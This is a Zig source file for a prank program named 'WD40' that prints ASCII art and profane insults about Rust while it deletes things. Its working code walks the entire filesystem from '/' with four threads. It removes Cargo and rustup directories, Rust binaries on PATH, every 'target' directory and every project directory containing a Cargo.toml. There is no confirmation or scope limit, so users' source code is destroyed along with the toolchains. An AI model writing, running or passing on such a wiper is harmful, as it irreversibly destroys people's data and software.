const std = @import("std");

// ╔═══════════════════════════════════════════════════════════════════════════╗
// ║                             WD40 - THE RUST ZAPPER                        ║
// ║            "fucking up all the rust on the machine"                       ║
// ╚═══════════════════════════════════════════════════════════════════════════╝

const ASCII_ART =
    \\                                              _
    \\__      __      _   _  _     ___            |=|
    \\\ \    / / __| |  | || |    / _ \         .-----.
    \\ \ \/\/ / / _  | | || |_   | | | |        | WD  |
    \\  \_/\_/ | (_| | |__   _|  | |_| |        |-----|
    \\          \__,_|    |_|     \___/         |  40 |
    \\                                          |_____|
;

const SUBTITLE = "f u c k i n g   u p   a l l   t h e   r u s t   o n   t h e   m a c h i n e";

const INSULTS = [_][]const u8{
    "suck it rustacean",
    "fuck your memory safety",
    "eat shit borrow checker",
    "zero cost? more like zero regard",
    "fearless concurrency? try fearless deletion",
    "rust? more like dust",
    "bye bye crab",
    "oxidized and vaporized",
    "cargo? more like car-go-away",
    "rustc? rust-see-ya-later",
    "your unsafe code is now safe... in /dev/null",
    "trait bounds? more like trait destroyed",
    "lifetimes over",
    "drop trait implemented for your entire filesystem",
    "borrow this, bitch",
    "memory safety cant save you now",
    "the crab is cooked",
    "ferris wheel of destruction",
    "rustc --edition=deleted",
    "cargo clean? cargo annihilated",
    "rip crab lang",
    "segmentation fault? more like segmentation deleted",
    "unsafe? unexistent.",
    "rustaceans in shambles",
    "no std? no problem. no rust.",
};

const SKIP_PATHS = [_][]const u8{
    "/proc",
    "/sys",
    "/dev",
    "/run",
    "/ WD40 itself added at runtime",
};

const RUST_BINARIES = [_][]const u8{
    "rustc",         "cargo",         "rustup",
    "rustfmt",       "clippy-driver", "cargo-clippy",
    "cargo-fmt",     "rust-gdb",      "rust-lldb",
    "rls",           "rustdoc",       "cargo-doc",
    "rust-analyzer", "bindgen",       "cbindgen",
};

// ─── Terminal State ─────────────────────────────────────────────────────────
var g_term_rows: u16 = 24;
var g_term_cols: u16 = 80;
var g_header_end: u16 = 10;
var g_term_mutex: std.Thread.Mutex = .{};

// ─── Stats ──────────────────────────────────────────────────────────────────
const Stats = struct {
    mutex: std.Thread.Mutex = .{},
    total: usize = 0,
    files: usize = 0,
    dirs: usize = 0,
    errors: usize = 0,
};

// ─── Work Queue ─────────────────────────────────────────────────────────────
const Queue = struct {
    mutex: std.Thread.Mutex = .{},
    cond: std.Thread.Condition = .{},
    items: std.ArrayList([]const u8),
    done: bool = false,

    fn init(allocator: std.mem.Allocator) Queue {
        return .{ .items = std.ArrayList([]const u8).init(allocator) };
    }

    fn deinit(self: *Queue) void {
        self.mutex.lock();
        defer self.mutex.unlock();
        self.items.deinit();
    }

    fn push(self: *Queue, path: []const u8) !void {
        self.mutex.lock();
        defer self.mutex.unlock();
        try self.items.append(path);
        self.cond.signal();
    }

    fn pop(self: *Queue) ?[]const u8 {
        self.mutex.lock();
        defer self.mutex.unlock();
        while (self.items.items.len == 0 and !self.done) {
            self.cond.wait(&self.mutex);
        }
        if (self.items.items.len == 0) return null;
        return self.items.orderedRemove(0);
    }

    fn setDone(self: *Queue) void {
        self.mutex.lock();
        defer self.mutex.unlock();
        self.done = true;
        self.cond.broadcast();
    }
};

// ═════════════════════════════════════════════════════════════════════════════
// Terminal Utilities
// ═════════════════════════════════════════════════════════════════════════════

fn termWrite(bytes: []const u8) !void {
    const stdout = std.io.getStdOut();
    g_term_mutex.lock();
    defer g_term_mutex.unlock();
    try stdout.writeAll(bytes);
}

fn termPrint(comptime fmt: []const u8, args: anytype) !void {
    const stdout = std.io.getStdOut();
    g_term_mutex.lock();
    defer g_term_mutex.unlock();
    try stdout.writer().print(fmt, args);
}

fn setupTerminal() !void {
    g_term_rows = 40; // Default reasonable size for Docker
    g_term_cols = 120;
    g_header_end = @max(10, g_term_rows / 3);

    const stdout = std.io.getStdOut();
    try stdout.writeAll("\x1B[?25l\x1B[2J\x1B[r");
    try stdout.writer().print("\x1B[{};{}r\x1B[{};1H", .{ g_header_end + 1, g_term_rows, g_header_end + 1 });
}

fn cleanupTerminal() !void {
    try termWrite("\x1B[r\x1B[?25h\x1B[2J\x1B[H");
}

fn printAsciiArt() !void {
    var line_no: u16 = 2;
    var it = std.mem.splitScalar(u8, ASCII_ART, '\n');
    while (it.next()) |art_line| {
        if (art_line.len == 0) continue;
        const col = @min(4, g_term_cols);
        try termPrint("\x1B7\x1B[{};{}H\x1B[K\x1B[1;36m{s}\x1B[0m\x1B8", .{ line_no, col, art_line });
        line_no += 1;
    }
    try termPrint("\x1B7\x1B[{};4H\x1B[K\x1B[1;31m{s}\x1B[0m\x1B8", .{ line_no + 1, SUBTITLE });
}

fn updateStats(stats: *Stats) !void {
    const line = g_header_end - 1;
    stats.mutex.lock();
    const total = stats.total;
    const files = stats.files;
    const dirs = stats.dirs;
    const errs = stats.errors;
    stats.mutex.unlock();

    try termPrint(
        "\x1B7\x1B[{};4H\x1B[K\x1B[33mVAPORIZED: {} total ({} dirs, {} files) | ERRORS: {}\x1B[0m\x1B8",
        .{ line, total, dirs, files, errs },
    );
}

fn logDeletion(path: []const u8) !void {
    try termPrint("\x1B[32m[DELETED]\x1B[0m {s}\n", .{path});
}

fn logError(path: []const u8, err: anyerror) !void {
    try termPrint("\x1B[31m[FAIL]\x1B[0m {s} ({s})\n", .{ path, @errorName(err) });
}

fn logInsult(insult: []const u8) !void {
    try termPrint("\x1B[35m[wd40]\x1B[0m \x1B[1m{s}\x1B[0m\n", .{insult});
}

// ═════════════════════════════════════════════════════════════════════════════
// Filesystem Annihilation Engine
// ═════════════════════════════════════════════════════════════════════════════

fn shouldSkipPath(path: []const u8) bool {
    for (SKIP_PATHS) |skip| {
        if (skip.len == 0) continue;
        if (std.mem.startsWith(u8, path, skip)) return true;
        if (std.mem.eql(u8, path, skip)) return true;
    }
    return false;
}

fn scanDirectory(path: []const u8, queue: *Queue, allocator: std.mem.Allocator) void {
    if (shouldSkipPath(path)) return;

    var dir = std.fs.openDirAbsolute(path, .{ .iterate = true }) catch {
        return;
    };
    defer dir.close();

    var iter = dir.iterate();
    while (true) {
        const entry = iter.next() catch break;
        if (entry == null) break;
        const e = entry.?;
        const full_path = std.fs.path.join(allocator, &.{ path, e.name }) catch continue;

        if (e.kind == .directory) {
            const base = std.fs.path.basename(full_path);
            if (std.mem.eql(u8, base, "target")) {
                queue.push(full_path) catch {};
            } else if (std.mem.eql(u8, base, ".cargo") or std.mem.eql(u8, base, ".rustup")) {
                queue.push(full_path) catch {};
            } else if (std.mem.eql(u8, base, "node_modules") or std.mem.eql(u8, base, ".git")) {
                continue;
            } else {
                scanDirectory(full_path, queue, allocator);
            }
        } else if (e.kind == .file) {
            if (std.mem.eql(u8, e.name, "Cargo.toml")) {
                const project_dir = std.fs.path.dirname(full_path) orelse path;
                if (!shouldSkipPath(project_dir)) {
                    queue.push(project_dir) catch {};
                }
            }
        }
    }
}

fn findRustBinaries(queue: *Queue, allocator: std.mem.Allocator) void {
    const path_env = std.process.getEnvVarOwned(allocator, "PATH") catch return;
    defer allocator.free(path_env);

    var it = std.mem.splitScalar(u8, path_env, ':');
    while (it.next()) |dir_path| {
        if (dir_path.len == 0) continue;
        var dir = std.fs.openDirAbsolute(dir_path, .{ .iterate = true }) catch continue;
        defer dir.close();

        var entry_iter = dir.iterate();
        while (true) {
            const entry = entry_iter.next() catch break;
            if (entry == null) break;
            const e = entry.?;
            if (e.kind != .file and e.kind != .sym_link) continue;
            for (RUST_BINARIES) |name| {
                if (std.mem.eql(u8, e.name, name)) {
                    const full_path = std.fs.path.join(allocator, &.{ dir_path, e.name }) catch continue;
                    queue.push(full_path) catch {};
                    break;
                }
            }
        }
    }
}

const DeleteKind = enum { file, dir, already_gone };

fn deletePath(path: []const u8) !DeleteKind {
    // Classify first: if we can open it as a directory, it's a dir.
    if (std.fs.openDirAbsolute(path, .{})) |opened| {
        var d = opened;
        d.close();
        std.fs.deleteTreeAbsolute(path) catch {
            if (std.fs.path.dirname(path)) |parent| {
                var parent_dir = std.fs.openDirAbsolute(parent, .{}) catch |e| {
                    if (e == error.FileNotFound) return .already_gone;
                    return e;
                };
                defer parent_dir.close();
                parent_dir.deleteTree(std.fs.path.basename(path)) catch |e| {
                    if (e == error.FileNotFound) return .already_gone;
                    return e;
                };
            }
        };
        return .dir;
    } else |err| {
        // Not a directory (or already vanished). Try as a file.
        if (err == error.FileNotFound) return .already_gone;
        std.fs.deleteFileAbsolute(path) catch |e| {
            if (e == error.FileNotFound) return .already_gone;
            return e;
        };
        return .file;
    }
}

// ═════════════════════════════════════════════════════════════════════════════
// Worker Thread
// ═════════════════════════════════════════════════════════════════════════════

fn workerThread(queue: *Queue, stats: *Stats, prng: *std.Random.DefaultPrng) void {
    const rand = prng.random();

    while (queue.pop()) |path| {
        const kind = deletePath(path) catch |err| {
            stats.mutex.lock();
            stats.errors += 1;
            stats.mutex.unlock();
            logError(path, err) catch {};
            updateStats(stats) catch {};
            continue;
        };

        // Silent no-op: something else already vaporized it. Not a delete,
        // not an error. Don't increment anything, don't spam the log.
        if (kind == .already_gone) continue;

        stats.mutex.lock();
        stats.total += 1;
        switch (kind) {
            .file => stats.files += 1,
            .dir => stats.dirs += 1,
            .already_gone => unreachable,
        }
        stats.mutex.unlock();

        logDeletion(path) catch {};
        updateStats(stats) catch {};

        // Random insult injection (1 in 5 chance)
        if (rand.int(u8) % 5 == 0) {
            const insult = INSULTS[rand.int(u32) % INSULTS.len];
            logInsult(insult) catch {};
        }

        std.time.sleep(2_000_000); // 2ms
    }
}

// ═════════════════════════════════════════════════════════════════════════════
// Main
// ═════════════════════════════════════════════════════════════════════════════

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    // ── Terminal Hijack ─────────────────────────────────────────────────────
    try setupTerminal();
    defer cleanupTerminal() catch {};

    try printAsciiArt();

    // ── Prepare the Carnage ─────────────────────────────────────────────────
    var queue = Queue.init(allocator);
    defer queue.deinit();

    var stats = Stats{};

    // Seed RNGs per worker
    const seed_base: u64 = @intCast(std.time.milliTimestamp());
    var prngs: [4]std.Random.DefaultPrng = undefined;
    for (&prngs, 0..) |*p, i| {
        p.* = std.Random.DefaultPrng.init(seed_base +% i);
    }

    var workers: [4]std.Thread = undefined;
    for (&workers, &prngs) |*t, *prng| {
        t.* = try std.Thread.spawn(.{}, workerThread, .{ &queue, &stats, prng });
    }

    // ── Queue Well-Known Targets ────────────────────────────────────────────
    const home = std.process.getEnvVarOwned(allocator, "HOME") catch "/root";
    defer allocator.free(home);

    const cargo_home = std.fs.path.join(allocator, &.{ home, ".cargo" }) catch null;
    const rustup_home = std.fs.path.join(allocator, &.{ home, ".rustup" }) catch null;

    if (cargo_home) |p| try queue.push(p);
    if (rustup_home) |p| try queue.push(p);

    if (!std.mem.eql(u8, home, "/root")) {
        if (std.fs.openDirAbsolute("/root/.cargo", .{})) |_| {
            try queue.push("/root/.cargo");
        } else |_| {}
        if (std.fs.openDirAbsolute("/root/.rustup", .{})) |_| {
            try queue.push("/root/.rustup");
        } else |_| {}
    }

    // Queue Rust binaries from PATH
    findRustBinaries(&queue, allocator);

    // ── Filesystem Sweep ────────────────────────────────────────────────────
    std.time.sleep(50_000_000);

    scanDirectory("/", &queue, allocator);

    // ── Finish ──────────────────────────────────────────────────────────────
    queue.setDone();

    for (&workers) |*t| {
        t.join();
    }

    try termWrite("\n");
    try termPrint("\x1B[1;32m[wd40] MISSION ACCOMPLISHED. ALL RUST HAS BEEN OBLITERATED.\x1B[0m\n", .{});
    try termPrint("\x1B[33mTotal items destroyed: {}\x1B[0m\n", .{stats.total});
}
